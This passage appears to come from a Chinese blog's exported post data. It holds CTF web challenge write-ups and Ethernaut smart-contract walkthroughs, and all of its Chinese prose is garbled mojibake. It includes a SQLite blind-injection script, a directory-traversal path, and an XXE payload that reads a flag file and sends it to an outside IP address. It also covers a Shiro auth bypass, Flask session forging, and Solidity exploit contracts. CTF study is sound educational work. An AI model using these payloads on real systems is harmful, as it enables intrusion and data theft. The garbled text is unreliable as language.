database\n$pdo = new PDO('sqlite:../db/vote.db');\n$res = $pdo->query(\"UPDATE vote SET count = count + 1 WHERE id = ${id}\");\nif ($res === false) {\n  die(json_encode(['error' => 'An error occurred while updating database']));\n}\n\n// succeeded!\necho json_encode([\n  'message' => 'Thank you for your vote! The result will be published after the CTF finished.'\n]);\n```\n\næ²¡è§è¿‡çš„sqliteï¼Œé¢˜è§£\n\n> è§£é¢˜æ€è·¯æ˜¯åˆ©ç”¨sqliteé€»è¾‘æŠ¥é”™è¿›è¡Œç›²æ³¨,abså‡½æ•°å­˜åœ¨æ•´å‹æº¢å‡º\n>\n> åˆ©ç”¨ifnull,nullifæ³¨å…¥flagé•¿åº¦\n\n```\nabs(ifnull(nullif(length((SELECT(flag)from(flag))),{i}),0x8000000000000000))\n```\n\nè¿™å¥è¯­å¥çš„æ„æ€æ˜¯ï¼Œå¦‚æœå‰é¢çš„lengthçš„å€¼ç­‰äºæˆ‘ä»¬ä¼ å…¥içš„å€¼ï¼Œé‚£ä¹ˆnullifå°±ä¼šè¿”å›nullï¼Œå¦‚æœè¿”å›äº†nullé‚£ä¹ˆifnullå°±ä¼šè¿”å›åé¢çš„å€¼ï¼Œæ­¤æ—¶absæº¢å‡ºæŠ¥é”™ï¼Œå¯ä»¥æ‹¿åˆ°flagé•¿åº¦\n\n```python\nimport requests\nurl = \"http://ba37c8a1-58fb-4250-a1f0-236c553ac9d6.node4.buuoj.cn:81/vote.php\"\nfor i in range(1,100):\n    data = {\n        'id':f'abs(ifnull(nullif(length((SELECT(flag)from(flag))),{i}),0x8000000000000000))'\n    }\n    rep = requests.post(url,data=data)\n    print(data)\n    if 'An error occurred' in rep.text:\n        print('length: '+str(i))\n        break\n```\n\nç„¶åé€šè¿‡||æ¥æ‹¼æ¥å­—ç¬¦ï¼Œé€šè¿‡replaceæ¥è¿›è¡Œé€ä½çŒœæµ‹ï¼Œé€šè¿‡è¿”å›çš„é•¿åº¦æ¥åšåˆ¤æ–­ï¼Œè€Œå¯¹äºå­—æ¯åˆ™ä½¿ç”¨hexæ¥æå–\n\n```python\ntable = {}\ntable['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)' # 'zebra' â†’ '7A65627261'\ntable['C'] = 'trim(hex(typeof(.1)),12567)' # 'real' â†’ '7265616C'\ntable['D'] = 'trim(hex(0xffffffffffffffff),123)' # 0xffffffffffffffff = -1 â†’ '2D31'\ntable['E'] = 'trim(hex(0.1),1230)' # 0.1 â†’ 302E31\ntable['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)' # 'dog' â†’ '646F67'\ntable['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table[\"C\"]}||{table[\"F\"]})' # 'koala' â†’ '6B6F616C61'\n```\n\næœ€ç»ˆé€šè¿‡[è„šæœ¬](https://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEBé¢˜è§£/#Sqlite-Voting)æ‹¿åˆ°flag\n\n## [ç½‘é¼æ¯ 2020 é’é¾™ç»„]filejava\n\nä¸€ä¸ªä¸Šä¼ ï¼Œä¸Šä¼ ä¹‹åå¯ä»¥ä¸‹è½½ï¼Œçœ‹åˆ°é“¾æ¥é‡Œé¢æœ‰æ–‡ä»¶åï¼Œå°è¯•ç›®å½•ç©¿è¶Šæ‹¿web.xmlæ–‡ä»¶![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210022204005.png)\n\nä¸‹è½½classï¼ˆ`../../../../../../../../../usr/local/tomcat/webapps/ROOT/WEB-INF/classes/cn/abc/servlet/DownloadServlet.class`ï¼‰è¿›è¡Œåç¼–è¯‘ï¼Œå¾—åˆ°æºç ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹ä¸Šä¼ çš„å…³é”®éƒ¨åˆ†\n\n```java\nif (filename.startsWith(\"excel-\") && \"xlsx\".equals(fileExtName))\n\ttry {\n\t\tWorkbook wb1 = WorkbookFactory.create(in);\n\t\tSheet sheet = wb1.getSheetAt(0);\n\t\tSystem.out.println(sheet.getFirstRowNum());\n\t} catch (InvalidFormatException e) {\n\t\tSystem.err.println(\"poi-ooxml-3.10 has something wrong\");\n\t\te.printStackTrace();\n\t}  \n```\n\næ­¤å¤„ä½¿ç”¨`poi-ooxml-3.10`æ¥è§£ææ•°æ®ï¼Œè¿™ä¸ªç‰ˆæœ¬æœ‰æ¼æ´å¯å¯¼è‡´XXEï¼ŒCVE-2014-3529\n\né‚£ä¹ˆå°±ç›´æ¥åˆ©ç”¨ï¼Œé¦–å…ˆåœ¨è‡ªå·±æœåŠ¡å™¨ä¸Šæ”¾ä¸€ä¸ªf.dtd\n\n```xml-dtd\n<!ENTITY % file SYSTEM \"file:///flag\">\n<!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'http://182.61.46.138?p=%file;'>\">\n```\n\nç„¶åæ›´æ”¹xlsxä¸­çš„[Content_Types].xmlæ–‡ä»¶ï¼Œæ·»åŠ å¦‚ä¸‹å†…å®¹\n\n```xml-dtd\n<!DOCTYPE convert [\n<!ENTITY % remote SYSTEM \"http://182.61.46.138/f.dtd\">\n%remote;%int;%send;\n]>\n```\n\né‡æ–°å‹ç¼©ä¸Šä¼ å³å¯æ¥æ”¶flag\n\n\n\n## [HXBCTF 2021]easywill\n\nè·Ÿæºç ï¼Œåé¢å†è¡¥\n\n## [ç¾ŠåŸæ¯ 2020]EasySer\n\nä¸ç»™æºç å°±æ˜¯çº¯çº¯æœ‰ç—…çš„è°œè¯­é¢˜ï¼Œç»™äº†æºç ç®€å•å¤šäº†ï¼Œæ­£å¸¸åºåˆ—åŒ–ä½¿ç”¨base64ç»•è¿‡dieå³å¯\n\n## [JMCTF 2021]UploadHub\n\n.htaccess\n\n## [çº¢æ˜è°·CTF 2021]JavaWeb\n\njavaï¼Œè¿›å»å°±æ˜¯è®©æˆ‘ä»¬loginï¼Œloginé¡µé¢è®©æˆ‘ä»¬è®¿é—®jsonï¼Œä½†æ˜¯æ²¡æƒé™éœ€è¦å…ˆç™»å½•ï¼Œé‚£å°±å°è¯•ä¼ å…¥ç™»å½•ï¼Œç™»å½•å¤±è´¥ï¼Œä½†æ˜¯çœ‹å“åº”å¤´![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210070120704.png)\n\nsetCookieä¸­çš„deleteMeå¯ä»¥ç¡®è®¤ä½¿ç”¨çš„æ˜¯shiroæ¡†æ¶ï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“ä¸ºå•¥\n\né‚£ä¹ˆé¦–å…ˆä½¿ç”¨CVE-2020-11989æ¥è¿›è¡ŒApache Shiroæƒé™ç»•è¿‡ï¼ŒåŠ ä¸ª/;/jsonæ¥ç›´æ¥è®¿é—®json\n\nç„¶åä½¿ç”¨CVE-2019-14439çš„ååºåˆ—åŒ–é“¾æ‰“è¿›å»ï¼Œç”¨JNDI-Injection-Exploitæ¥ç”Ÿæˆpayload\n\n## [HCTF 2018]Hideandseek\n\nç™»å½•ï¼Œä»»æ„è¾“å…¥é™¤adminä¹‹å¤–çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œç„¶åå°±è®©ä¸Šä¼ zipï¼Œç¬¬ä¸€ä»¶äº‹å°±æƒ³åˆ°è½¯è¿æ¥ï¼Œç¡®å®å¯ä»¥![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/202210102353287.png)\n\né‚£è¯»ä¸€ä¸‹æºç å§ï¼Œç›²çŒœæ˜¯ä¸ªpythonï¼Œprocè¯»è¯•è¯•ï¼Œ~~äº‹å®è¯æ˜ç›´æ¥è½æ˜¯æ²¡ä»€ä¹ˆåµå­ç”¨çš„~~ï¼Œè¿˜æ˜¯ä¹–ä¹–è¯»äº†environï¼Œç„¶å/app/main.pyè¯»æºç \n\n```python\n# -*- coding: utf-8 -*-\nfrom flask import Flask,session,render_template,redirect, url_for, escape, request,Response\nimport uuid\nimport base64\nimport random\nimport flag\nfrom werkzeug.utils import secure_filename\nimport os\nrandom.seed(uuid.getnode())\napp = Flask(__name__)\napp.config['SECRET_KEY'] = str(random.random()*100)\napp.config['UPLOAD_FOLDER'] = './uploads'\napp.config['MAX_CONTENT_LENGTH'] = 100 * 1024\nALLOWED_EXTENSIONS = set(['zip'])\n\ndef allowed_file(filename):\n    return '.' in filename and \\\n           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS\n\n\n@app.route('/', methods=['GET'])\ndef index():\n    error = request.args.get('error', '')\n    if(error == '1'):\n        session.pop('username', None)\n        return render_template('index.html', forbidden=1)\n\n    if 'username' in session:\n        return render_template('index.html', user=session['username'], flag=flag.flag)\n    else:\n        return render_template('index.html')\n\n\n@app.route('/login', methods=['POST'])\ndef login():\n    username=request.form['username']\n    password=request.form['password']\n    if request.method == 'POST' and username != '' and password != '':\n        if(username == 'admin'):\n            return redirect(url_for('index',error=1))\n        session['username'] = username\n    return redirect(url_for('index'))\n\n\n@app.route('/logout', methods=['GET'])\ndef logout():\n    session.pop('username', None)\n    return redirect(url_for('index'))\n\n@app.route('/upload', methods=['POST'])\ndef upload_file():\n    if 'the_file' not in request.files:\n        return redirect(url_for('index'))\n    file = request.files['the_file']\n    if file.filename == '':\n        return redirect(url_for('index'))\n    if file and allowed_file(file.filename):\n        filename = secure_filename(file.filename)\n        file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)\n        if(os.path.exists(file_save_path)):\n            return 'This file already exists'\n        file.save(file_save_path)\n    else:\n        return 'This file is not a zipfile'\n\n\n    try:\n        extract_path = file_save_path + '_'\n        os.system('unzip -n ' + file_save_path + ' -d '+ extract_path)\n        read_obj = os.popen('cat ' + extract_path + '/*')\n        file = read_obj.read()\n        read_obj.close()\n        os.system('rm -rf ' + extract_path)\n    except Exception as e:\n        file = None\n\n    os.remove(file_save_path)\n    if(file != None):\n        if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1):\n            return redirect(url_for('index', error=1))\n    return Response(file)\n\n\nif __name__ == '__main__':\n    #app.run(debug=True)\n    app.run(host='0.0.0.0', debug=True, port=10008)\n\n```\n\nçœ‹ä»£ç è¯»ä¸€ä¸‹éšæœºæ•°çš„ç§å­\n\n```python\nimport uuid\nimport random\n\nmac = \"0e:48:30:60:37:27\"\ntemp = mac.split(':')\ntemp = [int(i,16) for i in temp]\ntemp = [bin(i).replace('0b','').zfill(8) for i in temp]\ntemp = ''.join(temp)\nmac = int(temp,2)\nrandom.seed(mac)\nrandStr = str(random.random()*100)\nprint(randStr)#69.83331307187989\n```\n\nå‰©ä¸‹å°±æ˜¯ä¼ªé€ æ‹¿flag\n"},{"title":"Ethernautè®°å½•","url":"/posts/b1d79a49.html","content":"\n## Fallback\n\né¦–å…ˆçœ‹é€šå…³æ–¹å¼\n\n> ä»”ç»†çœ‹ä¸‹é¢çš„åˆçº¦ä»£ç .\n>\n> é€šè¿‡è¿™å…³ä½ éœ€è¦\n>\n> 1. è·å¾—è¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒ\n> 2. æŠŠä»–çš„ä½™é¢å‡åˆ°0\n>\n>  è¿™å¯èƒ½æœ‰å¸®åŠ©\n>\n> - å¦‚ä½•é€šè¿‡ä¸ABIäº’åŠ¨å‘é€ether\n> - å¦‚ä½•åœ¨ABIä¹‹å¤–å‘é€ether\n> - è½¬æ¢ wei/ether å•ä½ (å‚è§ `help()` å‘½ä»¤)\n> - Fallback æ–¹æ³•\n\nå†çœ‹ä»£ç \n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\nimport '@openzeppelin/contracts/math/SafeMath.sol';\ncontract Fallback {\n  using SafeMath for uint256;\n  mapping(address => uint) public contributions;\n  address payable public owner;\n  constructor() public {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n  modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n  function contribute() public payable {\n    require(msg.value < 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n  function withdraw() public onlyOwner {\n    owner.transfer(address(this).balance);\n  }\n  receive() external payable {\n    require(msg.value > 0 && contributions[msg.sender] > 0);\n    owner = msg.sender;\n  }\n}\n```\n\né€æ­¥åˆ†æï¼Œåœ¨åˆçº¦çš„æ„é€ å‡½æ•°ä¸­å°†åˆçº¦çš„éƒ¨ç½²è€…è®¾ç½®æˆäº†å‡½æ•°çš„ownerå¹¶ä¸”è®¾å®šäº†å…¶è´¡çŒ®å€¼ä¸º1000ethï¼Œå¦‚æœèµ°contributeå‡½æ•°æ¥è·å–owneræƒé™çš„è¯éœ€è¦è¶…è¿‡1000ethçš„è´¡çŒ®ï¼Œè€Œæ¯æ¬¡çš„è´¡çŒ®åˆéœ€è¦å°äº0.001ethï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸ç°å®çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹å‘receiveå‡½æ•°ï¼Œåœ¨è¿™é‡Œåªè¦æˆ‘ä»¬å‘receiveå‡½æ•°æºå¸¦ethï¼Œå¹¶ä¸”æˆ‘ä»¬æœ‰è´¡çŒ®å€¼å°±èƒ½æ‹¿åˆ°owneræƒé™ï¼Œæœ€åå†ä½¿ç”¨withdrawå°†åˆçº¦å‰©ä½™ä»£å¸è½¬å‡ºå³å¯\n\n- contract.contribute({value:1})\n- contract.sendTransaction({value:1})\n- contract.withdraw()\n\n## FallOut\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallout {\n  \n  using SafeMath for uint256;\n  mapping (address => uint) allocations;\n  address payable public owner;\n  /* constructor */\n  function Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n\n  modifier onlyOwner {\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    }\n\n  function allocate() public payable {\n    allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n  }\n\n  function sendAllocation(address payable allocator) public {\n    require(allocations[allocator] > 0);\n    allocator.transfer(allocations[allocator]);\n  }\n\n  function collectAllocations() public onlyOwner {\n    msg.sender.transfer(address(this).balance);\n  }\n\n  function allocatorBalance(address allocator) public view returns (uint) {\n    return allocations[allocator];\n  }\n}\n```\n\n> è¿™å¾ˆç™½ç—´æ˜¯å§? çœŸå®ä¸–ç•Œçš„åˆçº¦å¿…é¡»å®‰å…¨çš„å¤š, éš¾ä»¥å…¥ä¾µçš„å¤š, å¯¹å§?\n>\n> å®é™…ä¸Š... ä¹Ÿæœªå¿….\n>\n> Rubixiçš„æ•…äº‹åœ¨ä»¥å¤ªåŠç”Ÿæ€ä¸­éå¸¸çŸ¥å. è¿™ä¸ªå…¬å¸æŠŠåå­—ä» 'Dynamic Pyramid' æ”¹æˆ 'Rubixi' ä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆåœ°, ä»–ä»¬æ²¡æœ‰æŠŠåˆçº¦çš„ constructor æ–¹æ³•ä¹Ÿä¸€èµ·æ›´å:\n>\n> ```\n> contract Rubixi {\n>   address private owner;\n>   function DynamicPyramid() { owner = msg.sender; }\n>   function collectAllFees() { owner.transfer(this.balance) }\n>   ...\n> ```\n>\n> è¿™è®©æ”»å‡»è€…å¯ä»¥è°ƒç”¨æ—§åˆçº¦çš„constructor ç„¶åè·å¾—åˆçº¦çš„æ§åˆ¶æƒ, ç„¶åå†è·å¾—ä¸€äº›èµ„äº§. æ˜¯çš„. è¿™äº›é‡å¤§é”™è¯¯åœ¨æ™ºèƒ½åˆçº¦çš„ä¸–ç•Œæ˜¯æœ‰å¯èƒ½çš„.\n\nå°±è¿™æ²¡é”™\n\n## Coin Flip\n\n> è¿™æ˜¯ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆï¼Œä½ éœ€è¦è¿ç»­çš„çŒœå¯¹ç»“æœã€‚å®Œæˆè¿™ä¸€å…³ï¼Œä½ éœ€è¦é€šè¿‡ä½ çš„è¶…èƒ½åŠ›æ¥è¿ç»­çŒœå¯¹åæ¬¡ã€‚\n>\n> è¿™å¯èƒ½èƒ½å¸®åŠ©åˆ°ä½ \n>\n> - æŸ¥çœ‹ä¸Šé¢çš„å¸®åŠ©é¡µé¢ï¼Œâ€œæ§åˆ¶å°ä¹‹å¤–â€ éƒ¨åˆ†\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract CoinFlip {\n\n  using SafeMath for uint256;\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() public {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\n\n    if (lastHash == blockValue) {\n      revert();//å›æ»š\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue.div(FACTOR);\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n```\n\nçœ‹ä»£ç å®šä¹‰çš„ä¸‰ä¸ªæ•°å­—consecutiveWinsï¼ŒlastHashï¼ŒFACTORï¼Œåˆ†åˆ«æ˜¯æˆ‘ä»¬è·èƒœçš„æ¬¡æ•°ï¼Œæœ€åä¸€æ¬¡åŒºå—çš„å“ˆå¸Œï¼Œè¿˜æœ‰2çš„255æ¬¡æ–¹\n\nå†çœ‹åé¢æ•´ä¸ªå¯¹ç¡¬å¸åè½¬åšåˆ¤æ–­çš„å‡½æ•°å†…å®¹ï¼Œé¦–å…ˆæ˜¯è®©blockValueå€¼ä¸ºå‰ä¸€ä¸ªåŒºå—ï¼Œå¹¶ä¸”è¿›è¡Œåˆ¤æ–­å¦‚æœæ­¤æ¬¡çŒœæµ‹å’Œä¸Šæ¬¡çŒœæµ‹çš„åŒºå—ç›¸åŒå°±å›æ»šæ•´ä¸ªè¿‡ç¨‹ï¼Œå¦‚æœä¸æ˜¯å°±ç»§ç»­ä¸‹é¢å†…å®¹\n\né¦–å…ˆå°†æ­¤æ¬¡çš„åŒºå—å†…å®¹å­˜å‚¨ï¼Œå¹¶ä¸”è®©coinFilpçš„å€¼ä¸ºblockValue/FACTORï¼Œæ­¤å¤„ç”±äºè‡ªåŠ¨å–æ•´ï¼Œå¹¶ä¸”FACTORå€¼ä¸º2^255ï¼Œæ‰€ä»¥ç»“æœé1å³0ï¼Œå¯ä»¥çœ‹åˆ°æ•´ä¸ªè¿‡ç¨‹éšæœºç»“æœçš„äº§ç”Ÿå®Œå…¨ä¾é äºä¸Šä¸€ä¸ªåŒºå—ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦å…ˆæœ¬åœ°æ‰§è¡Œä¸€éç®—æ³•è®¡ç®—å‡ºcoinFlipçš„å€¼å°±èƒ½ä¿è¯æˆ‘ä»¬æ¯æ¬¡éƒ½â€œçŒœâ€åˆ°ç»“æœï¼ŒåŒºå—å¤§çº¦ä¸º10ç§’ä¸€ä¸ªï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨æ‰‹æ’¸å¤åˆ¶çŒœæµ‹æ˜¯ä¸ç°å®ï¼Œæˆ‘ä»¬å¯ä»¥å†å†™ä¸€ä¸ªåˆçº¦éƒ¨ç½²åˆ°ç›¸åŒçš„åŒºå—é“¾ä¸Šæ¥æ”»å‡»è¯¥é“¾\n\n```solidity\npragma solidity ^0.4.18;\ncontract CoinFlip {\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n  function CoinFlip() public {\n    consecutiveWins = 0;\n  }\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(block.blockhash(block.number-1));\n    if (lastHash == blockValue) {\n      revert();\n    }\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue/FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n\ncontract exploit {\n  CoinFlip expFlip;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n  function exploit(address aimAddr) {\n    expFlip = CoinFlip(aimAddr);\n  }\n  function hack() public {\n    uint256 blockValue = uint256(block.blockhash(block.number-1));\n    uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);\n    bool guess = coinFlip == 1 ? true : false;\n    expFlip.flip(guess);\n  }\n}\n```\n\nåœ¨Remix IDEä¸­é€šè¿‡Metamaskéƒ¨ç½²åˆ°é¢˜ç›®çš„åŒºå—é“¾ä¸Šï¼Œè¿›è¡Œ10æ¬¡hackæ”»å‡»å³å¯\n\n> é€šè¿‡solidityäº§ç”Ÿéšæœºæ•°æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“. ç›®å‰æ²¡æœ‰ä¸€ä¸ªå¾ˆè‡ªç„¶çš„æ–¹æ³•æ¥åšåˆ°è¿™ä¸€ç‚¹, è€Œä¸”ä½ åœ¨æ™ºèƒ½åˆçº¦ä¸­åšçš„æ‰€æœ‰äº‹æƒ…éƒ½æ˜¯å…¬å¼€å¯è§çš„, åŒ…æ‹¬æœ¬åœ°å˜é‡å’Œè¢«æ ‡è®°ä¸ºç§æœ‰çš„çŠ¶æ€å˜é‡. çŸ¿å·¥å¯ä»¥æ§åˆ¶ blockhashes, æ—¶é—´æˆ³, æˆ–æ˜¯æ˜¯å¦åŒ…æ‹¬æŸä¸ªäº¤æ˜“, è¿™å¯ä»¥è®©ä»–ä»¬æ ¹æ®ä»–ä»¬ç›®çš„æ¥å·¦å³è¿™äº›äº‹æƒ….\n>\n> æƒ³è¦è·å¾—å¯†ç å­¦ä¸Šçš„éšæœºæ•°,ä½ å¯ä»¥ä½¿ç”¨ [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), å®ƒä½¿ç”¨é¢„è¨€æœº, LINK token, å’Œä¸€ä¸ªé“¾ä¸Šåˆçº¦æ¥æ£€éªŒè¿™æ˜¯ä¸æ˜¯çœŸçš„æ˜¯ä¸€ä¸ªéšæœºæ•°.\n>\n> ä¸€äº›å…¶å®ƒçš„é€‰é¡¹åŒ…æ‹¬ä½¿ç”¨æ¯”ç‰¹å¸block headers (é€šè¿‡éªŒè¯ [BTC Relay](http://btcrelay.org/)), [RANDAO](https://github.com/randao/randao), æˆ–æ˜¯ [Oraclize](http://www.oraclize.it/)).\n\n## Telephone\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\ncontract Telephone {\n  address public owner;\n  constructor() public {\n    owner = msg.sender;\n  }\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n```\n\nç›´æ¥çœ‹`tx.origin`å’Œ`msg.sender`çš„åŒºåˆ«\n\n**msg.sender:** æŒ‡ç›´æ¥è°ƒç”¨æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„å¸æˆ·æˆ–æ™ºèƒ½åˆçº¦çš„åœ°å€\n**tx.origin:** æŒ‡è°ƒç”¨æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„è´¦æˆ·åœ°å€ï¼Œåªæœ‰è´¦æˆ·åœ°å€å¯ä»¥æ˜¯tx.origin\n\n![](https://img.learnblockchain.cn/attachments/2022/02/XyJFUGH5620dcb1e08bda.jpg)\n\næˆ‘ä»¬å¼€ä¸€ä¸ªæ–°åˆçº¦ç›´æ¥ä¼ å…¥æˆ‘ä»¬è‡ªå·±çš„addressé€šè¿‡æ–°åˆçº¦è°ƒç”¨Telephoneåˆçº¦å³å¯\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.4.16;\ncontract Telephone {\n  address public owner;\n  constructor() public {\n    owner = msg.sender;\n  }\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\ncontract hh{\n    address ow=0xeeD53DF0B7E5CF4272a2E92c4E39B1405910d8C7;\n    Telephone exp;\n    constructor(address name){\n        exp=Telephone(name);\n    }\n    function hack(){\n        exp.changeOwner(ow);\n    }\n}\n```\n\n> è¿™ä¸ªä¾‹å­æ¯”è¾ƒç®€å•, æ··æ·† `tx.origin` å’Œ `msg.sender` ä¼šå¯¼è‡´ phishing-style æ”»å‡», æ¯”å¦‚[this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/).\n>\n> ä¸‹é¢æè¿°äº†ä¸€ä¸ªå¯èƒ½çš„æ”»å‡».\n>\n> 1. ä½¿ç”¨ `tx.origin` æ¥å†³å®šè½¬ç§»è°çš„token, æ¯”å¦‚.\n>\n> ```\n> function transfer(address _to, uint _value) {\n>   tokens[tx.origin] -= _value;\n>   tokens[_to] += _value;\n> }\n> ```\n>\n> 2. æ”»å‡»è€…é€šè¿‡è°ƒç”¨åˆçº¦çš„ transfer å‡½æ•°æ˜¯å—å®³è€…å‘æ¶æ„åˆçº¦è½¬ç§»èµ„äº§, æ¯”å¦‚\n>\n> ```\n> function () payable {\n>   token.transfer(attackerAddress, 10000);\n> }\n> ```\n>\n> 3. åœ¨è¿™ä¸ªæƒ…å†µä¸‹, `tx.origin` æ˜¯å—å®³è€…çš„åœ°å€ ( `msg.sender` æ˜¯æ¶æ„åè®®çš„åœ°å€), è¿™ä¼šå¯¼è‡´å—å®³è€…çš„èµ„äº§è¢«è½¬ç§»åˆ°æ”»å‡»è€…çš„æ‰‹ä¸Š.\n\n## Token\n\n> è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯æ”»ç ´ä¸‹é¢è¿™ä¸ªåŸºç¡€ token åˆçº¦\n>\n> ä½ æœ€å¼€å§‹æœ‰20ä¸ª token, å¦‚æœä½ é€šè¿‡æŸç§æ–¹æ³•å¯ä»¥å¢åŠ ä½ æ‰‹ä¸­çš„ token æ•°é‡,ä½ å°±å¯ä»¥é€šè¿‡è¿™ä¸€å…³,å½“ç„¶è¶Šå¤šè¶Šå¥½\n>\n>  è¿™å¯èƒ½æœ‰å¸®åŠ©:\n>\n> - ä»€ä¹ˆæ˜¯ odometer?\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\ncontract Token {\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public {\n    balances[msg.sender] = totalSupply = _initialSupply;\n  }\n\n  function transfer(address _to, uint _value) public returns (bool) {\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  }\n\n  function balanceOf(address _owner) public view returns (uint balance) {\n    return balances[_owner];\n  }\n}\n```\n\nçœ‹ä»£ç ï¼Œbalancesæ˜ å°„çš„ç›¸å½“æ˜¯æˆ‘ä»¬çš„tokenä¸ªæ•°ï¼Œåˆå§‹ä¸º20ä¸ªï¼Œå†çœ‹transferå‡½æ•°ï¼Œè¦æ±‚æˆ‘ä»¬çš„tokenæ•°å‡å»äº¤æ˜“æ•°è¦å¤§äºç­‰äº0ï¼Œä½†æ˜¯é—®é¢˜æ˜¯tokenæ•°å’Œäº¤æ˜“æ•°éƒ½æ˜¯uintç±»å‹ï¼Œæ’å¤§äºç­‰äº0ï¼ˆå› ä¸ºè¿ç®—ç»“æœä¹Ÿæ˜¯uintç±»å‹ï¼‰ï¼Œæ‰€ä»¥requireæ ¹æœ¬ä¸éœ€è¦ç»•è¿‡ï¼Œå¦‚æœæˆ‘ä»¬å°†`_value`å€¼è®¾å®šä¸º21ï¼Œå°±ä¼šå‡ºç°æº¢å‡ºï¼Œå¯¼è‡´æˆ‘ä»¬çš„balanceæå¤§ï¼Œä¹Ÿå°±å®Œæˆäº†ä»»åŠ¡\n\n```\ncontract.transfer(instance,21)\n```\n\n> Overflow åœ¨ solidity ä¸­éå¸¸å¸¸è§, ä½ å¿…é¡»å°å¿ƒæ£€æŸ¥, æ¯”å¦‚ä¸‹é¢è¿™æ ·:\n>\n> ```\n> if(a + c > a) {\n>   a = a + c;\n> }\n> ```\n>\n> å¦ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ OpenZeppelin çš„ SafeMath åº“, å®ƒä¼šè‡ªåŠ¨æ£€æŸ¥æ‰€æœ‰æ•°å­¦è¿ç®—çš„æº¢å‡º, å¯ä»¥åƒè¿™æ ·ä½¿ç”¨:\n>\n> ```\n> a = a.add(c);\n> ```\n>\n> å¦‚æœæœ‰æº¢å‡º, ä»£ç ä¼šè‡ªåŠ¨æ¢å¤.\n\n## Delegation\n\n> è¿™ä¸€å…³çš„ç›®æ ‡æ˜¯ç”³æ˜ä½ å¯¹ä½ åˆ›å»ºå®ä¾‹çš„æ‰€æœ‰æƒ.\n>\n>  è¿™å¯èƒ½æœ‰å¸®åŠ©\n>\n> - ä»”ç»†çœ‹solidityæ–‡æ¡£å…³äº `delegatecall` çš„ä½çº§å‡½æ•°, ä»–æ€ä¹ˆè¿è¡Œçš„, ä»–å¦‚ä½•å°†æ“ä½œå§”æ‰˜ç»™é“¾ä¸Šåº“, ä»¥åŠä»–å¯¹æ‰§è¡Œçš„å½±å“.\n> - Fallback æ–¹æ³•\n> - æ–¹æ³• ID\n\n```solidity\n// SPDX-License-Identifier: 